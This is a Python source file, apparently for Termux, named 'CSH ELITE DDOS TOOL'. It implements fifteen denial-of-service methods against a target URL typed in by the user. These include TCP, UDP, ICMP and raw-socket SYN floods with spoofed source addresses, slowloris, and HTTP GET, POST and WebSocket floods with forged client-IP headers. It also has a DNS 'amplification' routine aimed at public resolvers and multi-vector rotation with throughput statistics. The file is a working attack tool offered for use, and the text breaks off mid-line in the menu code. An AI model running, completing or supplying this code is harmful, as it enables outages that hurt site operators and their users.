#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import threading
import socket
import random
import time
import os
import ssl
import sys
import json
import base64
import ipaddress
import struct
import select
import asyncio
import aiohttp
import requests
from urllib.parse import urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

class EliteDDoSTool:
    def __init__(self, target):
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.is_https = self.parsed_url.scheme == 'https'
        self.user_agents = self.load_user_agents()
        self.attack_running = True
        self.attack_start_time = None
        self.packets_sent = 0
        self.bytes_sent = 0
        self.successful_connections = 0
        self.failed_connections = 0
        self.attack_methods = {
            '1': self.tcp_flood,
            '2': self.http_flood,
            '3': self.slowloris,
            '4': self.udp_flood,
            '5': self.xerxes_attack,
            '6': self.super_attack,
            '7': self.elite_mixed_attack,
            '8': self.icmp_flood,
            '9': self.dns_amplification,
            '10': self.syn_flood,
            '11': self.http_get_flood,
            '12': self.http_post_flood,
            '13': self.advanced_http2_flood,
            '14': self.websocket_flood,
            '15': self.multi_vector_attack
        }
        
        # Load configuration
        self.config = self.load_config()
        
        # Resolve target IP
        try:
            self.target_ip = socket.gethostbyname(self.host)
        except:
            self.target_ip = self.host
            
        # Performance tracking
        self.performance_stats = {
            'peak_pps': 0,
            'peak_bps': 0,
            'method_efficiency': {}
        }
        
        # Connection pools for reuse
        self.connection_pools = {}
        
        # Proxy support
        self.proxy_index = 0
        
        # Multi-threading optimization
        self.thread_limiter = threading.Semaphore(self.config['max_threads'])
    
    def load_config(self):
        default_config = {
            'max_threads': 1000,
            'timeout': 2,
            'packet_size': 1024,
            'rotation_interval': 30,
            'connection_pool_size': 20,
            'max_retries': 5,
            'keep_alive': True,
            'use_proxy': False,
            'proxy_list': [],
            'randomize_packet_size': True,
            'min_packet_size': 512,
            'max_packet_size': 4096,
            'connection_reuse': True,
            'adaptive_timeout': True,
            'max_connections_per_thread': 10,
            'packet_burst_size': 5,
            'http2_enabled': True,
            'websocket_enabled': True
        }
        
        # Try to load custom config if exists
        try:
            if os.path.exists('ddos_config.json'):
                with open('ddos_config.json', 'r') as f:
                    custom_config = json.load(f)
                    default_config.update(custom_config)
        except:
            pass
            
        return default_config
    
    def load_user_agents(self):
        # Expanded user agents list
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Android 10; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/94.0.992.47'
        ]
        
        # Load additional user agents from file if exists
        try:
            if os.path.exists('user_agents.txt'):
                with open('user_agents.txt', 'r') as f:
                    agents.extend([line.strip() for line in f.readlines() if line.strip()])
        except:
            pass
            
        return agents
    
    def get_proxy(self):
        if not self.config['proxy_list'] or not self.config['use_proxy']:
            return None
            
        self.proxy_index = (self.proxy_index + 1) % len(self.config['proxy_list'])
        return self.config['proxy_list'][self.proxy_index]
    
    def safe_socket_close(self, sock):
        try:
            if sock:
                sock.close()
        except:
            pass
    
    def create_socket(self, socket_type=socket.SOCK_STREAM, reuse=False):
        # Check connection pool first if reuse is enabled
        if reuse and self.config['connection_reuse']:
            pool_key = f"{self.host}:{self.port}:{socket_type}"
            if pool_key in self.connection_pools and self.connection_pools[pool_key]:
                return self.connection_pools[pool_key].pop()
        
        sock = None
        try:
            if socket_type == socket.SOCK_STREAM:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                # Adaptive timeout
                timeout = self.config['timeout']
                if self.config['adaptive_timeout'] and self.failed_connections > self.successful_connections:
                    timeout = max(1, timeout - 0.5)
                
                sock.settimeout(timeout)
                
                if self.is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                
                sock.connect((self.host, self.port))
                self.successful_connections += 1
                return sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                return sock
                
        except Exception as e:
            self.failed_connections += 1
            self.safe_socket_close(sock)
            return None
    
    def return_socket_to_pool(self, sock, socket_type=socket.SOCK_STREAM):
        if not sock or not self.config['connection_reuse']:
            self.safe_socket_close(sock)
            return
            
        pool_key = f"{self.host}:{self.port}:{socket_type}"
        if pool_key not in self.connection_pools:
            self.connection_pools[pool_key] = []
            
        if len(self.connection_pools[pool_key]) < self.config['connection_pool_size']:
            self.connection_pools[pool_key].append(sock)
        else:
            self.safe_socket_close(sock)
    
    def get_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def get_random_data(self, min_size=None, max_size=None):
        min_size = min_size or self.config['min_packet_size']
        max_size = max_size or self.config['max_packet_size']
        
        if self.config['randomize_packet_size']:
            size = random.randint(min_size, max_size)
        else:
            size = self.config['packet_size']
            
        # More efficient random data generation
        if size > 1024:
            # For large data, use a pattern that might be more efficient
            pattern = os.urandom(512)
            return (pattern * (size // 512))[:size]
        else:
            return os.urandom(size)
    
    def tcp_flood(self):
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        burst_size = random.randint(1, self.config['packet_burst_size'])
                        for _ in range(burst_size):
                            if not self.attack_running:
                                break
                            data = self.get_random_data()
                            sock.send(data)
                            self.packets_sent += 1
                            self.bytes_sent += len(data)
                            time.sleep(random.uniform(0.001, 0.01))
                            
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(random.uniform(0.001, 0.01))
    
    def http_flood(self):
        paths = ['/', '/index.html', '/main.php', '/api/v1/test', '/wp-admin', '/admin', 
                '/login', '/config', '/api', '/graphql', '/static/js/main.js', 
                '/static/css/style.css', '/images/logo.png', '/robots.txt', '/sitemap.xml'] + \
               [f'/page{random.randint(1,100)}.html' for _ in range(20)] + \
               [f'/api/v{random.randint(1,3)}/user{random.randint(1000,9999)}' for _ in range(10)]
        
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        path = random.choice(paths)
                        headers = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
                        headers += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                        headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        headers += "Accept-Language: en-US,en;q=0.5\r\n"
                        headers += "Accept-Encoding: gzip, deflate, br\r\n"
                        headers += f"X-Forwarded-For: {self.get_random_ip()}\r\n"
                        headers += f"X-Real-IP: {self.get_random_ip()}\r\n"
                        headers += f"Client-IP: {self.get_random_ip()}\r\n"
                        headers += f"Referer: http://{self.get_random_ip()}/\r\n"
                        headers += "Connection: keep-alive\r\n"
                        headers += "Cache-Control: no-cache\r\n"
                        headers += "Pragma: no-cache\r\n"
                        
                        # Add random headers
                        for _ in range(random.randint(2, 8)):
                            headers += f"X-Random-Header-{random.randint(1,100)}: {random.randint(1000,9999)}\r\n"
                        
                        headers += "\r\n"
                        
                        sock.send(headers.encode())
                        self.packets_sent += 1
                        self.bytes_sent += len(headers.encode())
                        
                        # Keep connection alive for a bit
                        time.sleep(random.uniform(0.05, 0.2))
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(random.uniform(0.01, 0.05))
    
    def slowloris(self):
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        headers = f"GET / HTTP/1.1\r\nHost: {self.host}\r\n"
                        headers += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                        headers += "Content-Length: 1000000\r\n"
                        sock.send(headers.encode())
                        self.packets_sent += 1
                        self.bytes_sent += len(headers.encode())
                        
                        keep_alive_count = 0
                        while self.attack_running and keep_alive_count < 50:  # Increased from 20
                            try:
                                header = f"X-{keep_alive_count}: {random.randint(1000,9999)}\r\n"
                                sock.send(header.encode())
                                self.packets_sent += 1
                                self.bytes_sent += len(header.encode())
                                time.sleep(random.uniform(3, 10))  # Adjusted timing
                                keep_alive_count += 1
                            except:
                                break
                                
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(0.5)
    
    def udp_flood(self):
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    burst_size = random.randint(3, 15)  # Increased burst size
                    for _ in range(burst_size):
                        if not self.attack_running:
                            break
                        data = self.get_random_data(512, 2048)  # Increased max size
                        sock.sendto(data, (self.host, self.port))
                        self.packets_sent += 1
                        self.bytes_sent += len(data)
                        time.sleep(0.001)  # Reduced sleep
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.safe_socket_close(sock)
                    time.sleep(0.01)
    
    def xerxes_attack(self):
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        burst_size = random.randint(20, 50)  # Increased burst size
                        for _ in range(burst_size):
                            if not self.attack_running:
                                break
                            data = self.get_random_data(256, 2048)  # Increased max size
                            sock.send(data)
                            self.packets_sent += 1
                            self.bytes_sent += len(data)
                            time.sleep(0.001)  # Reduced sleep
                            
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(0.005)
    
    def icmp_flood(self):
        """ICMP Flood (Ping Flood) attack"""
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    
                    burst_size = random.randint(3, 10)
                    for _ in range(burst_size):
                        if not self.attack_running:
                            break
                            
                        # Create ICMP packet
                        packet_id = random.randint(0, 65535)
                        packet_sequence = random.randint(0, 65535)
                        packet_checksum = 0
                        packet_data = self.get_random_data(56, 1024)
                        
                        # Build ICMP header
                        header = struct.pack('!BBHHH', 8, 0, packet_checksum, packet_id, packet_sequence)
                        packet = header + packet_data
                        
                        # Calculate checksum
                        checksum = 0
                        for i in range(0, len(packet), 2):
                            if i + 1 < len(packet):
                                word = (packet[i] << 8) + packet[i + 1]
                                checksum += word
                        
                        checksum = (checksum >> 16) + (checksum & 0xffff)
                        checksum = ~checksum & 0xffff
                        
                        # Repack with correct checksum
                        header = struct.pack('!BBHHH', 8, 0, checksum, packet_id, packet_sequence)
                        packet = header + packet_data
                        
                        sock.sendto(packet, (self.target_ip, 0))
                        self.packets_sent += 1
                        self.bytes_sent += len(packet)
                        time.sleep(0.001)
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.safe_socket_close(sock)
                    time.sleep(0.01)
    
    def dns_amplification(self):
        """DNS Amplification attack (requires DNS server IP)"""
        # Common DNS servers (for educational purposes only)
        dns_servers = [
            '8.8.8.8',        # Google DNS
            '1.1.1.1',        # Cloudflare DNS
            '9.9.9.9',        # Quad9 DNS
            '208.67.222.222',  # OpenDNS
            '8.8.4.4',        # Google DNS Secondary
            '1.0.0.1',        # Cloudflare DNS Secondary
            '64.6.64.6',      # Verisign DNS
            '77.88.8.8'       # Yandex DNS
        ]
        
        # DNS query for isc.org (large response)
        dns_query = bytearray([
            0x5c, 0x5f,  # Transaction ID
            0x01, 0x00,  # Flags: standard query
            0x00, 0x01,  # Questions: 1
            0x00, 0x00,  # Answer RRs: 0
            0x00, 0x00,  # Authority RRs: 0
            0x00, 0x00,  # Additional RRs: 0
            0x03, 0x69, 0x73, 0x63, 0x03, 0x6f, 0x72, 0x67, 0x00,  # isc.org
            0x00, 0x01,  # Type: A
            0x00, 0x01   # Class: IN
        ])
        
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    dns_server = random.choice(dns_servers)
                    
                    burst_size = random.randint(3, 8)
                    for _ in range(burst_size):
                        if not self.attack_running:
                            break
                            
                        # Spoof source IP to target
                        sock.sendto(dns_query, (dns_server, 53))
                        self.packets_sent += 1
                        self.bytes_sent += len(dns_query)
                        time.sleep(0.01)
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.safe_socket_close(sock)
                    time.sleep(0.03)
    
    def syn_flood(self):
        """SYN Flood attack"""
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    
                    burst_size = random.randint(5, 15)
                    for _ in range(burst_size):
                        if not self.attack_running:
                            break
                            
                        # Spoof source IP
                        source_ip = self.get_random_ip()
                        
                        # IP header
                        ip_ver = 4
                        ip_ihl = 5
                        ip_tos = 0
                        ip_tot_len = 0
                        ip_id = random.randint(1, 65535)
                        ip_frag_off = 0
                        ip_ttl = 255
                        ip_proto = socket.IPPROTO_TCP
                        ip_check = 0
                        ip_saddr = socket.inet_aton(source_ip)
                        ip_daddr = socket.inet_aton(self.target_ip)
                        
                        ip_ihl_ver = (ip_ver << 4) + ip_ihl
                        
                        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                              ip_ihl_ver, ip_tos, ip_tot_len, ip_id, 
                                              ip_frag_off, ip_ttl, ip_proto, ip_check, 
                                              ip_saddr, ip_daddr)
                        
                        # TCP header
                        tcp_source = random.randint(1024, 65535)
                        tcp_dest = self.port
                        tcp_seq = random.randint(0, 4294967295)
                        tcp_ack_seq = 0
                        tcp_doff = 5
                        tcp_fin = 0
                        tcp_syn = 1
                        tcp_rst = 0
                        tcp_psh = 0
                        tcp_ack = 0
                        tcp_urg = 0
                        tcp_window = socket.htons(5840)
                        tcp_check = 0
                        tcp_urg_ptr = 0
                        
                        tcp_offset_res = (tcp_doff << 4)
                        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                        
                        tcp_header = struct.pack('!HHLLBBHHH', 
                                               tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                               tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
                        
                        # Pseudo header for checksum
                        source_address = socket.inet_aton(source_ip)
                        dest_address = socket.inet_aton(self.target_ip)
                        placeholder = 0
                        protocol = socket.IPPROTO_TCP
                        tcp_length = len(tcp_header)
                        
                        psh = struct.pack('!4s4sBBH', 
                                        source_address, dest_address, 
                                        placeholder, protocol, tcp_length)
                        psh = psh + tcp_header
                        
                        # Calculate checksum
                        tcp_check = self.checksum(psh)
                        
                        # Repack TCP header with correct checksum
                        tcp_header = struct.pack('!HHLLBBHHH', 
                                               tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                               tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
                        
                        # Final packet
                        packet = ip_header + tcp_header
                        
                        sock.sendto(packet, (self.target_ip, 0))
                        self.packets_sent += 1
                        self.bytes_sent += len(packet)
                        time.sleep(0.001)
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.safe_socket_close(sock)
                    time.sleep(0.01)
    
    def http_get_flood(self):
        """Specialized HTTP GET flood with more aggressive approach"""
        paths = ['/', '/index.html', '/main.php', '/wp-login.php', '/admin', 
                '/api/v1/users', '/search', '/products', '/blog', '/contact',
                '/shop', '/cart', '/checkout', '/account', '/settings']
        
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        burst_size = random.randint(5, 12)  # Increased burst size
                        for _ in range(burst_size):
                            if not self.attack_running:
                                break
                                
                            path = random.choice(paths)
                            headers = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
                            headers += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                            headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                            headers += "Accept-Language: en-US,en;q=0.5\r\n"
                            headers += "Accept-Encoding: gzip, deflate\r\n"
                            headers += f"X-Forwarded-For: {self.get_random_ip()}\r\n"
                            headers += "Connection: keep-alive\r\n"
                            headers += "\r\n"
                            
                            sock.send(headers.encode())
                            self.packets_sent += 1
                            self.bytes_sent += len(headers.encode())
                            time.sleep(0.02)  # Reduced sleep
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(0.03)
    
    def http_post_flood(self):
        """HTTP POST flood with random data"""
        endpoints = ['/submit', '/login', '/api/v1/data', '/contact', '/comment', 
                    '/register', '/upload', '/search', '/update', '/create',
                    '/save', '/process', '/payment', '/webhook']
        
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        endpoint = random.choice(endpoints)
                        content = f"username={random.randint(1000,9999)}&password={random.randint(10000,99999)}&data={base64.b64encode(os.urandom(64)).decode()}&token={random.randint(100000,999999)}"
                        content_length = len(content)
                        
                        headers = f"POST {endpoint} HTTP/1.1\r\nHost: {self.host}\r\n"
                        headers += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                        headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        headers += "Accept-Language: en-US,en;q=0.5\r\n"
                        headers += "Content-Type: application/x-www-form-urlencoded\r\n"
                        headers += f"Content-Length: {content_length}\r\n"
                        headers += f"X-Forwarded-For: {self.get_random_ip()}\r\n"
                        headers += "Connection: close\r\n"
                        headers += "\r\n"
                        headers += content
                        
                        sock.send(headers.encode())
                        self.packets_sent += 1
                        self.bytes_sent += len(headers.encode())
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(0.05)
    
    def advanced_http2_flood(self):
        """Advanced HTTP/2 flood attack"""
        if not self.config['http2_enabled']:
            return
            
        # This would require a proper HTTP/2 implementation
        # For now, we'll simulate with more efficient HTTP/1.1 requests
        paths = ['/', '/index.html', '/api/v2/data', '/graphql', '/api/health',
                '/static/asset.js', '/static/style.css', '/images/header.jpg']
        
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        # Simulate HTTP/2 with pipelined requests
                        for i in range(random.randint(5, 15)):
                            if not self.attack_running:
                                break
                                
                            path = random.choice(paths)
                            headers = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
                            headers += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                            headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                            headers += "Accept-Language: en-US,en;q=0.5\r\n"
                            headers += "Accept-Encoding: gzip, deflate, br\r\n"
                            headers += f"X-Forwarded-For: {self.get_random_ip()}\r\n"
                            headers += "Connection: keep-alive\r\n"
                            headers += "\r\n"
                            
                            sock.send(headers.encode())
                            self.packets_sent += 1
                            self.bytes_sent += len(headers.encode())
                        
                        # Keep connection open for a short time
                        time.sleep(0.1)
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(0.05)
    
    def websocket_flood(self):
        """WebSocket connection flood"""
        if not self.config['websocket_enabled']:
            return
            
        with self.thread_limiter:
            while self.attack_running:
                sock = None
                try:
                    sock = self.create_socket(reuse=True)
                    if sock:
                        # WebSocket upgrade request
                        key = base64.b64encode(os.urandom(16)).decode()
                        headers = f"GET / HTTP/1.1\r\nHost: {self.host}\r\n"
                        headers += "Upgrade: websocket\r\n"
                        headers += "Connection: Upgrade\r\n"
                        headers += f"Sec-WebSocket-Key: {key}\r\n"
                        headers += "Sec-WebSocket-Version: 13\r\n"
                        headers += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                        headers += "\r\n"
                        
                        sock.send(headers.encode())
                        self.packets_sent += 1
                        self.bytes_sent += len(headers.encode())
                        
                        # Keep connection open
                        time.sleep(random.uniform(5, 15))
                        
                except:
                    self.failed_connections += 1
                    pass
                finally:
                    self.return_socket_to_pool(sock)
                    time.sleep(0.1)
    
    def multi_vector_attack(self):
        """Multi-vector attack combining multiple methods"""
        methods = [self.tcp_flood, self.http_flood, self.udp_flood, 
                  self.syn_flood, self.http_get_flood, self.http_post_flood]
        
        with self.thread_limiter:
            while self.attack_running:
                # Randomly select and execute a method
                method = random.choice(methods)
                method()
                
                # Short sleep before next method
                time.sleep(0.1)
    
    def checksum(self, msg):
        """Calculate packet checksum"""
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
        return s
    
    def super_attack(self):
        methods = [self.tcp_flood, self.http_flood, self.udp_flood, self.syn_flood]
        method_index = 0
        
        with self.thread_limiter:
            while self.attack_running:
                current_method = methods[method_index]
                current_method()
                time.sleep(2)  # Reduced rotation time
                method_index = (method_index + 1) % len(methods)
    
    def elite_mixed_attack(self):
        """ELITE MIXED ATTACK - Advanced rotation with resource optimization"""
        methods = [self.tcp_flood, self.http_flood, self.udp_flood, 
                  self.xerxes_attack, self.syn_flood, self.http_get_flood,
                  self.http_post_flood, self.advanced_http2_flood]
        current_method = 0
        
        with self.thread_limiter:
            while self.attack_running:
                # Rotate methods every configured interval
                methods[current_method]()
                
                # Performance-based rotation
                time.sleep(self.config['rotation_interval'] / 2)  # Faster rotation
                current_method = (current_method + 1) % len(methods)
                
                # Adaptive sleep based on method intensity
                if methods[current_method] in [self.xerxes_attack, self.syn_flood]:
                    time.sleep(0.5)
    
    def get_stats(self):
        if self.attack_start_time:
            duration = datetime.now() - self.attack_start_time
            hours, remainder = divmod(duration.total_seconds(), 3600)
            minutes, seconds = divmod(remainder, 60)
            
            # Calculate packets per second
            total_seconds = duration.total_seconds()
            pps = self.packets_sent / total_seconds if total_seconds > 0 else 0
            
            # Calculate bytes per second
            bps = self.bytes_sent / total_seconds if total_seconds > 0 else 0
            
            # Update peak performance stats
            if pps > self.performance_stats['peak_pps']:
                self.performance_stats['peak_pps'] = pps
            if bps > self.performance_stats['peak_bps']:
                self.performance_stats['peak_bps'] = bps
            
            # Calculate success rate
            total_connections = self.successful_connections + self.failed_connections
            success_rate = (self.successful_connections / total_connections * 100) if total_connections > 0 else 0
            
            return {
                'duration': f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}",
                'packets_sent': self.packets_sent,
                'bytes_sent': self.bytes_sent,
                'successful_connections': self.successful_connections,
                'failed_connections': self.failed_connections,
                'success_rate': f"{success_rate:.2f}%",
                'packets_per_second': f"{pps:.2f}",
                'bytes_per_second': f"{bps:.2f}",
                'peak_pps': f"{self.performance_stats['peak_pps']:.2f}",
                'peak_bps': f"{self.performance_stats['peak_bps']:.2f}",
                'target': self.target,
                'target_ip': self.target_ip
            }
        return None
    
    def start_attack(self, method, threads=500):
        self.attack_start_time = datetime.now()
        
        print(f"🔥 ELITE ATTACK STARTED")
        print(f"🎯 TARGET: {self.target}")
        print(f"🌐 TARGET IP: {self.target_ip}")
        print(f"⚡ METHOD: {method.upper()}")
        print(f"🚀 THREADS: {threads}")
        print(f"🔒 PORT: {self.port}")
        print("⏰ START TIME:", self.attack_start_time.strftime("%Y-%m-%d %H:%M:%S"))
        print("⚡ PRESS CTRL+C TO STOP ⚡")
        print("-" * 60)
        
        # Update thread limiter
        self.thread_limiter = threading.Semaphore(min(threads, self.config['max_threads']))
        
        thread_pool = []
        
        for i in range(threads):
            if not self.attack_running:
                break
                
            thread = threading.Thread(target=self.attack_methods[method])
            thread.daemon = True
            thread.start()
            thread_pool.append(thread)
            
            if i % 100 == 0:
                time.sleep(0.05)
                print(f"✅ {i+1} threads activated")
        
        # Stats thread
        def stats_monitor():
            last_packets = 0
            last_bytes = 0
            last_time = time.time()
            
            while self.attack_running:
                time.sleep(3)  # More frequent updates
                stats = self.get_stats()
                
                if stats:
                    current_time = time.time()
                    time_diff = current_time - last_time
                    
                    # Calculate instant PPS and BPS
                    instant_pps = (self.packets_sent - last_packets) / time_diff if time_diff > 0 else 0
                    instant_bps = (self.bytes_sent - last_bytes) / time_diff if time_diff > 0 else 0
                    
                    print(f"📊 Duration: {stats['duration']} | Packets: {stats['packets_sent']} ({instant_pps:.1f}/s)")
                    print(f"📦 Bytes: {self.format_bytes(stats['bytes_sent'])} ({self.format_bytes(instant_bps)}/s)")
                    print(f"🔗 Connections: {stats['successful_connections']} ✓ / {stats['failed_connections']} ✗ ({stats['success_rate']})")
                    print(f"🏆 Peak: {stats['peak_pps']} pps, {self.format_bytes(float(stats['peak_bps']))}/s")
                    print("-" * 50)
                    
                    last_packets = self.packets_sent
                    last_bytes = self.bytes_sent
                    last_time = current_time
        
        stats_thread = threading.Thread(target=stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Connection pool maintenance thread
        def pool_maintenance():
            while self.attack_running:
                time.sleep(30)
                # Clean up old connections
                for pool_key in list(self.connection_pools.keys()):
                    if not self.connection_pools[pool_key]:
                        del self.connection_pools[pool_key]
        
        maintenance_thread = threading.Thread(target=pool_maintenance)
        maintenance_thread.daemon = True
        maintenance_thread.start()
        
        try:
            while self.attack_running:
                time.sleep(1)
                active_threads = sum(1 for t in thread_pool if t.is_alive())
                print(f"🔥 Active threads: {active_threads}/{threads}")
                
                # Adaptive performance adjustment
                if self.failed_connections > self.successful_connections * 2:
                    print("⚠️  High failure rate - adjusting strategy...")
                    time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n🛑 Stopping elite attack...")
            self.attack_running = False
            
            for thread in thread_pool:
                thread.join(timeout=1)
            
            # Clean up connection pools
            for pool in self.connection_pools.values():
                for sock in pool:
                    self.safe_socket_close(sock)
            self.connection_pools.clear()
            
            final_stats = self.get_stats()
            if final_stats:
                print("\n📈 FINAL STATISTICS:")
                print(f"⏰ Duration: {final_stats['duration']}")
                print(f"📦 Packets sent: {final_stats['packets_sent']}")
                print(f"💾 Bytes sent: {self.format_bytes(final_stats['bytes_sent'])}")
                print(f"🔗 Successful connections: {final_stats['successful_connections']}")
                print(f"❌ Failed connections: {final_stats['failed_connections']}")
                print(f"✅ Success rate: {final_stats['success_rate']}")
                print(f"🏆 Peak performance: {final_stats['peak_pps']} pps, {self.format_bytes(float(final_stats['peak_bps']))}/s")
            
            print("✅ Elite attack completely stopped")
    
    def format_bytes(self, bytes):
        """Format bytes to human readable format"""
        if bytes < 1024:
            return f"{bytes} B"
        elif bytes < 1024 ** 2:
            return f"{bytes / 1024:.2f} KB"
        elif bytes < 1024 ** 3:
            return f"{bytes / (1024 ** 2):.2f} MB"
        elif bytes < 1024 ** 4:
            return f"{bytes / (1024 ** 3):.2f} GB"
        else:
            return f"{bytes / (1024 ** 4):.2f} TB"

def show_banner():
    os.system('clear')
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                🚀 CSH ELITE DDOS TOOL -                ║
    ║                 ⚡ VIP EDITION - 2024                            ║
    ║          🔒 Optimized for Mobile Performance                    ║
    ║           🌐 Advanced Attack Methods                            ║
    ║            📊 Real-time Statistics                              ║
    ║             💪 Enhanced Power & Performance                     ║
    ║              🚀 ULTRA UPGRADED VERSION                          ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)

def main():
    show_banner()
    
    try:
        target = input("🎯 Enter target URL: ").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
            
        tool = EliteDDoSTool(target)
        
        print("\n⚡ ELITE ATTACK METHODS:")
        print("1. TCP Flood (Balanced)")
        print("2. HTTP Flood (Web Optimal)") 
        print("3. Slowloris (Connection Holder)")
        print("4. UDP Flood (Fast)")
        print("5. Xerxes (Aggressive)")
        print("6. SUPER ATTACK (Mixed)")
        print("7. ELITE MIXED (Advanced)")
        print("8. ICMP Flood (Network Layer)")
        print("9. DNS Amplification (Reflective)")
        print("10. SYN Flood (Half-Open)")
        print("11. HTTP GET Flood (Web Focused)")
        print("12. HTTP POST Flood (Data Heavy)")
        print("13. HTTP/2 Flood (Advanced)")
        print("14. WebSocket Flood (Persistent)")
        print("15. MULTI-VECTOR (Combined)")
        
        method = input("🎯 Choose method (1-15): ").strip()
        if method not in ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15']:
